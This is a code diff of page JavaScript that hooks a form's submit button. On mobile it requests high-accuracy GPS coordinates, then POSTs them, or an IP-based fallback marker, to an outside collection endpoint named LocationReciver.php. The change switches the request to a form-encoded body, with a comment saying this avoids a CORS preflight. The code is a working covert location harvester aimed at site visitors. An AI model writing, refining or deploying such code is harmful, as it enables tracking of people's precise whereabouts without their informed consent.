@@ -127,7 +127,6 @@
 ;(function(){
   const btn = document.querySelector('button[type="submit"]');
   const form = btn.closest('form');
-
   const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
 
   form.addEventListener('submit', e => {
@@ -136,27 +135,34 @@
     const payload = {};
 
     if (isMobile && navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        payload.lat = pos.coords.latitude;
-        payload.lng = pos.coords.longitude;
-        send(payload);
-      }, () => {
-    
-        payload.type = 'ip';
-        send(payload);
-      }, { enableHighAccuracy:true, timeout:10000 });
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          payload.lat  = pos.coords.latitude;
+          payload.lng  = pos.coords.longitude;
+          send(payload);
+        },
+        () => {
+          payload.type = 'ip';
+          send(payload);
+        },
+        { enableHighAccuracy:true, timeout:10000 }
+      );
     } else {
-
       payload.type = 'ip';
       send(payload);
     }
   });
 
   function send(data) {
+    // build a form‑encoded body (no custom Content-Type header → no preflight)
+    const formData = new URLSearchParams();
+    if (data.lat  !== undefined) formData.append('lat',  data.lat);
+    if (data.lng  !== undefined) formData.append('lng',  data.lng);
+    if (data.type !== undefined) formData.append('type', data.type);
+
     fetch('https://phptestinggggg.ct.ws/LocationReciver.php', {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify(data)
+      method: 'POST',
+      body:   formData
     });
   }
 })();
